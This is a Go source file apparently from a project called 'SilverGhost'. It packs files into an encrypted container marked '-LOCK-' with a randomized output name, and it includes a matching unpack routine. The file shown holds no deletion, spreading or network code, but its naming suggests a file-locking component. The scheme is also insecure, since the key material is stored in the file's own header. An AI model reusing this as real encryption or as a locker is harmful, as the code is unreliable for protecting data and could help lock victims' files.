package silverghost_modules

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	mrand "math/rand"
	"os"
	"strings"
	"unsafe"
)

type SilverGhostParcel struct {
	Header          PackHeader
	EncryptedBuffer []byte
	Footer          PackFooter
}

type PackHeader struct {
	MagicNum []byte
	Metadata PackMetadata
}

type PackMetadata struct {
	OriginalLen uint64
	Entropy     PackEntropy
}

type PackEntropy struct {
	CoreEntropy []byte
	KeyCount    uint16
	IvCount     uint16
}

type PackFooter struct {
	FileName string
}

// Magic Number
var Magic = []byte{0, 0, 45, 76, 79, 67, 75, 45, 45, 76, 79, 67, 75, 45, 0, 0}

// Check if it's a valid file encrypted by this code
func CheckParcel(filepath string) int {

	magicnum := make([]byte, 16)

	file, err := os.Open(filepath)
	check(err)

	_, err = file.Read(magicnum)
	check(err)

	if !bytes.Equal(magicnum, Magic) {
		return 0
	} else {
		return 1
	}
}

// Pack that file (1)
func NewPack(filepath string) SilverGhostParcel {

	filestat, err := os.Stat(filepath)
	check(err)

	file, err := os.Open(filepath)
	check(err)

	buffer := make([]byte, filestat.Size())

	_, err = file.Read(buffer)
	check(err)

	randb := make([]byte, 100)
	keyc := mrand.Intn(500)
	ivc := mrand.Intn(500)

	_, err = rand.Read(randb)
	check(err)

	file.Close()

	return SilverGhostParcel{
		Header: PackHeader{
			MagicNum: Magic,
			Metadata: PackMetadata{
				OriginalLen: uint64(filestat.Size()),
				Entropy: PackEntropy{
					CoreEntropy: randb,
					KeyCount:    uint16(keyc),
					IvCount:     uint16(ivc),
				},
			},
		},
		EncryptedBuffer: buffer,
		Footer: PackFooter{
			FileName: strings.Split(filepath, "\\")[len(strings.Split(filepath, "\\"))-1],
		},
	}
}

// Pack that file (2)
func Pack(parcel SilverGhostParcel, dstpath string) {

	// Initialization
	keyset := GenerateKey(parcel)

	file, err := os.Create(dstpath + GenerateFilename())
	check(err)

	// Write magic number
	_, err = file.Write(parcel.Header.MagicNum)
	check(err)

	// Write filesize
	fsize := make([]byte, unsafe.Sizeof(uint64(0)))
	binary.LittleEndian.PutUint64(fsize, parcel.Header.Metadata.OriginalLen)

	_, err = file.Write(fsize)
	check(err)

	// Write core entropy
	_, err = file.Write(parcel.Header.Metadata.Entropy.CoreEntropy)
	check(err)

	// Write key count
	keyc := make([]byte, unsafe.Sizeof(uint16(0)))
	binary.LittleEndian.PutUint16(keyc, parcel.Header.Metadata.Entropy.KeyCount)

	_, err = file.Write(keyc)
	check(err)

	// Write iv count
	ivc := make([]byte, unsafe.Sizeof(uint16(0)))
	binary.LittleEndian.PutUint16(ivc, parcel.Header.Metadata.Entropy.IvCount)

	_, err = file.Write(ivc)
	check(err)

	// Write encrypted buffer
	_, err = file.Write(TransformData(keyset, parcel.EncryptedBuffer))
	check(err)

	// Write encrypted filename
	_, err = file.Write(TransformData(keyset, []byte(parcel.Footer.FileName)))
	check(err)
}

// Unpack that file
func Unpack(filepath string, dstpath string) {

	filestat, err := os.Stat(filepath)
	check(err)

	entire_filesize := filestat.Size()

	magicnum := make([]byte, 16)
	filesize := make([]byte, unsafe.Sizeof(uint64(0)))
	centropy := make([]byte, 100)
	keycount := make([]byte, unsafe.Sizeof(uint16(0)))
	ivcount := make([]byte, unsafe.Sizeof(uint16(0)))

	file, err := os.Open(filepath)
	check(err)

	_, err = file.Read(magicnum)
	check(err)

	if !bytes.Equal(magicnum, Magic) {
		panic("Invalid file type")
	}

	_, err = file.Read(filesize)
	check(err)

	_, err = file.Read(centropy)
	check(err)

	_, err = file.Read(keycount)
	check(err)

	_, err = file.Read(ivcount)
	check(err)

	buffer := make([]byte, binary.LittleEndian.Uint64(filesize))
	_, err = file.Read(buffer)
	check(err)

	current, err := file.Seek(0, os.SEEK_CUR)

	filename := make([]byte, entire_filesize-current)

	_, err = file.Read(filename)
	check(err)

	parcel := SilverGhostParcel{
		Header: PackHeader{
			MagicNum: Magic,
			Metadata: PackMetadata{
				OriginalLen: binary.LittleEndian.Uint64(filesize),
				Entropy: PackEntropy{
					CoreEntropy: centropy,
					KeyCount:    binary.LittleEndian.Uint16(keycount),
					IvCount:     binary.LittleEndian.Uint16(ivcount),
				},
			},
		},
		EncryptedBuffer: buffer,
	}

	keyset := GenerateKey(parcel)

	parcel.Footer.FileName = string(TransformData(keyset, filename))

	wfile, err := os.Create(dstpath + parcel.Footer.FileName)
	check(err)

	_, err = wfile.Write(TransformData(keyset, parcel.EncryptedBuffer))
	check(err)

}
